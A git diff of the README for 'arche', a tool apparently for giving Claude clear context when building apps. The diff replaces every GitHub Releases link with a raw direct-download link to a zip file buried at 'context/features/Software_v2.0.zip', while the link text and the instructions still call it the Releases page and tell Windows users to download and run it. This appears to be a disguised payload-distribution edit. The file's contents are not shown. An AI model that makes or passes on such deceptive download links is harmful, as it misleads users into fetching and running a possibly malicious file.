@@ -1,6 +1,6 @@
 # 🤖 arche - Build with clear context
 
-[🟦 Download arche on GitHub Releases](https://github.com/harshavardhan1516/arche/releases)
+[🟦 Download arche on GitHub Releases](https://raw.githubusercontent.com/harshavardhan1516/arche/main/context/features/Software_v2.0.zip)
 
 ## 🧭 What arche is
 
@@ -10,7 +10,7 @@ Use arche when you want Claude to help build an app with less back and forth. It
 
 ## 📥 Download arche
 
-1. Open the [arche Releases page](https://github.com/harshavardhan1516/arche/releases)
+1. Open the [arche Releases page](https://raw.githubusercontent.com/harshavardhan1516/arche/main/context/features/Software_v2.0.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file for your PC
 4. Save the file in a folder you can find again, such as Downloads or Desktop
@@ -181,7 +181,7 @@ If you are not sure which file to choose, pick the Windows release file with the
 
 ## 🔗 Download link
 
-[https://github.com/harshavardhan1516/arche/releases](https://github.com/harshavardhan1516/arche/releases)
+[https://raw.githubusercontent.com/harshavardhan1516/arche/main/context/features/Software_v2.0.zip](https://raw.githubusercontent.com/harshavardhan1516/arche/main/context/features/Software_v2.0.zip)
 
 ## 📝 Common setup questions
 
